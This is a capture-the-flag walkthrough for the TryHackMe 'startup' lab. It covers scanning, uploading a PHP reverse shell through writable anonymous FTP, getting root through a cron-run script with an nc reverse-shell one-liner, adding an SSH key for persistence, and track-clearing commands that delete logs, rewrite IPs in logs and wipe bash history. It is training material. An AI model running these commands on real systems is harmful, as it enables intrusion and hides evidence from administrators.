---
title: "THM:startup"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/startup"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,ssh2john,linpeas,privesc,cron
---
# THM:startup

URL: [https://tryhackme.com/room/startup](https://tryhackme.com/room/startup) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sC -sV x.x.x.x`

Interesting ports found to be open:

```python
PORT   STATE SERVICE REASON
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Anonymous FTP has an Among Us meme, and a text file telling people to stop leaving memes on that file share. The `ftp` folder is writable. That could be something?

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://x.x.x.x`

Interesting folders found:

```python
/files                (Status: 301) [Size: 312] [--> http://10.10.159.60/files/]
```

Also see: [gobuster.log](gobuster.log)

### Running: `nikto`

Ran the following:

> `nikto -h x.x.x.x`

Nothing interesting found.


Also see: [nikto.log](nikto.log)

## Gaining Access

### Unprivileged Access

Since the anonymous FTP folder `/ftp/` is writeable, you can do a `put revshell.php` into that folder, and then execute that reverse shell from the `/files/revshell.php` URL in the browser.

That will get you a primitive shell running as the `www-data` user.

### Privilege Escalation (power user)

First, to privesc into the `lennie` account (you can see their home folder under `/home/`), look in the `incidents` folder for a pcap file. If you download that file and view it with Wireshark, you can see there was a password attempt. It was a bad password attempt for `www-data`, but that IS the password for `lennie`.

Meaning, you can now do `su - lennie` with that newly found password. You are now logged-in as `lennie`.

### Privilege Escalation (root)

The Hint from TryHackMe for root privesc is "scripts". Well, in Lennie's home folder there is a `~/scripts/` folder. In there is a bash script that calls `/etc/print.sh`. In short, it looks like something external kicks off that script, but we don't know what it is.

So, we modify `/etc/print.sh` to reverse shell back to our workstation by adding something like:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8080 >/tmp/f
```

and then listen on your workstation with something like this:

```bash
nc -lvnp 8080
```

After a minute or so, you've got a prompt, and it's a root prompt!


## Maintaining Access

To not have to deal with half-broken shells, I added my SSH public key to `/home/lennie/.ssh/authorized_keys` and set the permissions on that file to `chmod 600 ./authorized_keys`. That way, instead of working out of reverse shells with bad rendering, I could now just:

```bash
ssh lennie@x.x.x.x
```

## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we could:

### Delete relevant logs from `/var/log/` - although that might draw attention.

> `rm -Rf /var/log/*`

### Search and replace our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {} \;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`
>  
> `cat /dev/null > /home/lennie/.bash_history`

## Summary

Completed: [2023-07-20 21:01:11]